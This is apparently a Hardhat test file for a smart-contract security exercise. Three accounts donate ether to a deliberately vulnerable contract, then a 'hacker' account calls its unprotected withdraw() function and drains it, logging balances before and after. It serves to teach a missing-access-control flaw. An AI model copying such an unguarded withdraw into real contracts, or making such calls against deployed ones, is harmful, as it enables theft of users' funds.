const{expect} = require("chai");
const{expectRevert} = require("@openzeppelin/test-helpers");


describe("Missing Access Control Attack", function(){

    let owner, account1, account2, account3, hacker,
        ToAttackAccessControlMissing, toAttackAccessControlMissing;


    before(async()=>{

        [owner, account1, account2, account3, hacker] = await ethers.getSigners();

        ToAttackAccessControlMissing = await ethers.getContractFactory("ToAttackAccessControlMissing");
        toAttackAccessControlMissing = await ToAttackAccessControlMissing.deploy(owner.address);
        await toAttackAccessControlMissing.deployed();

    });


    it("All the users should be able to deposit some ether to 'ToAttack' contract", async()=>{

        await toAttackAccessControlMissing.connect(account1).donate({value: ethers.utils.parseEther("25")});
        await toAttackAccessControlMissing.connect(account2).donate({value: ethers.utils.parseEther("50")});
        await toAttackAccessControlMissing.connect(account3).donate({value: ethers.utils.parseEther("75")});

        let balanceToAttack = await ethers.provider.getBalance(toAttackAccessControlMissing.address);

        console.log("Balance To Attack Contract after donations", (balanceToAttack/10**18).toString(), "ether");
        console.log("");
    });



    it("Exploit: Hacker drain the contract", async()=>{

        let hackerBalanceBeforeExploit = await ethers.provider.getBalance(hacker.address);
        console.log("Hacker Balance before exploit", (hackerBalanceBeforeExploit/10**18).toString(), "ether");

        await toAttackAccessControlMissing.connect(hacker).withdraw();

        let balanceToAttack = await ethers.provider.getBalance(toAttackAccessControlMissing.address);
        console.log("Balance To Attack Contract after Exploit", (balanceToAttack/10**18).toString(), "ether");

        let hackerBalanceAfterExploit = await ethers.provider.getBalance(hacker.address);
        console.log("Hacker Balance after exploit", (hackerBalanceAfterExploit/10**18).toString(), "ether");
    });
})